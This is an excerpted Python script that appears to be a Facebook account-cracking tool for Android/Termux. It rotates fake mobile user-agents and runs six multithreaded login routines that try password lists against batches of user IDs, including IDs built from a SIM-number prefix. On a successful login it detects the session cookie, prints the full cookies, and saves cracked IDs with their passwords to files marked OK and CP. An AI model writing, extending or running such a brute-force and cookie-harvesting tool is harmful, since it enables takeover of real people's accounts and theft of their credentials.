...
try:
    ...
    exit(e)
for crtr in range(10000):
    aa='Mozilla/5.0 (Linux; U; Android 11;'
    b=random.choice(['6','7','8','9','10','11','12'])
    c='fr-fr; Oppo A5 Build/'
    ...
    ugen.append(uaku2)
#Mozilla/5.0 (Linux; U; Android 11; fr-fr; Oppo A5 /RKQ1.211001.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36 XiaoMi/MiuiBrowser/12.22.0.3-gn
...
def uaku2():
	try:
		...
		a=requests.get('https://github.com/Sonu-crtr/crtr/blob/main/ua2.txt').text
		ua=open('.ua2.txt','w')
...
os.system("crtrg-open https://github.com/Sonu-crtr")
#app  check 
...
def Sonucrtr():
    ...
    elif aryan =='7':os.system("crtrg-open https://www.facebook.com/aaryan.chaudhary69")
    else:
...
def Sonucrtr1():
	...
	print("[+]==============================================")
	Sonulovesyou = input("[+] [CHOOSE] :- ")
	if Sonulovesyou in ['y','Y','1','yes','YES','Yes']:
		Sonu_crtr.append('y')
	else:
		Sonu_crtr.append('n')
	print("[+]==============================================")
	...
	print("[+]==============================================")
	Sonutop = input("[+] [CHOOSE] :- ")
	if Sonutop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
		...
		print(f'[+] METHOD CHOOSED : M{Sonucrtr}')
		...
		for guru in user:
			...
			if Sonucrtr =='1':yaari.submit(mbasic,uid,pwx,tl)
			elif Sonucrtr =='2':yaari.submit(p,uid,pwx,tl)
			elif Sonucrtr =='3':yaari.submit(x,uid,pwx,tl)
			elif Sonucrtr =='4':yaari.submit(mobile,uid,pwx,tl)
			elif Sonucrtr =='5':yaari.submit(freeq,uid,pwx,tl)
			elif Sonucrtr =='6':yaari.submit(d,uid,pwx,tl)
			else:
	...
	print('[?] Ids saved in Sonucrtr-OK.txt,Sonucrtr-CP.txt')
...
def Sonu2():
	...
	print('[?] Ids saved in Sonu-OK.txt,Sonu-CP.txt')
	print(47*"-")
...
def Sonu3():
	...
	os.system('clear')
	print(logo)
	print('[+] USE YOUR FOUR DIGIT OF SIM NUMBER  (8958)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	...
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in Sonu-OK.txt,Sonup-CP.txt')
	print(47*"-")
...
def Sonu4():
	...
	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
	print("[+]==============================================")
	Sonucrtrtop = input("[+] [CHOOSE] :- ")
	if Sonucrtrtop in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	with ThreadPool(max_workers=30) as yaari:
...
def Sonu5():
	...
	print("[+] DO YOU WANNA SHOW CP IDZ (Y/N) :- ")
	print("[+]==============================================")
	Sonutcrtr = input("[+] [CHOOSE] :- ")
	if Sonulovesyou in ['y','Y','Yes','YES','1']:
		baby.append('y')
	else:
		baby.append('n')
	...
	with ThreadPool(max_workers=50) as manshera:
		...
		for love in user:
			...
			for Eman in HamiiID:
				pwx.append(Eman)
			if Sonucrtr =='1':manshera.submit(mbasic,uid,pwx,tl)
			elif Sonucrtr =='2':manshera.submit(p,uid,pwx,tl)
			elif Sonucrtr =='3':manshera.submit(x,uid,pwx,tl)
			elif Sonucrtr =='4':manshera.submit(mobile,uid,pwx,tl)
			elif Sonucrtr =='5':manshera.submit(freeq,uid,pwx,tl)
			elif Sonucrtr =='6':manshera.submit(d,uid,pwx,tl)
			else:
...
def mbasic(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[1;92m[Sonu-OK] '+uid+' | '+ps+'\33[0;97m')
				if 'y' in Sonu_crtr:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
					break
				open('/sdcard/Sonu-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
				...
				cid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[Sonu-CP] '+uid+' | '+ps+'\33[0;97m')
					open('/sdcard/Sonu-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/Sonu-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M1-Sonu] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def p(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M2-Sonu] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def x(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				uid = coki[141:156]
				if 'y' in baby:
					print('\33[1;91m[Sonu-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/Sonu-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M3-Sonu] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def mobile(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[151:166]
				print('\33[1;92m[Sonu-OK] '+cid+' | '+ps+'\33[0;97m')
				if 'y' in Sonu_crtr:
					print("\33[1;92m[💚] \33[1;98mCOOKIES : \33[1;92m"+coki)
					cek_apk(session,coki)
				else:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M4-Sonu] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def freeq(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M5-Sonu] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
		sys.stdout.flush()
	except:
		pass
...
def d(uid,pwx,tl):
    ...
    'upgrade-insecure-requests':'1',
			...
			if 'c_user' in log_cookies:
				...
				if 'y' in baby:
					print('\33[1;91m[Sonu-CP] '+cid+' | '+ps+'\33[0;97m')
					open('/sdcard/Sonucrtr-CP.txt', 'a').write(cid+' | '+ps+'\n')
					cps.append(cid)
					break
				else:
					open('/sdcard/Sonucrtr-CP.txt', 'a').write(cid+' | '+ps+'\n')
				...
				continue
		loop+=1
		sys.stdout.write('\r\33[1;37m[M6-Sonu] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))), 
		sys.stdout.flush()
	except:
		pass
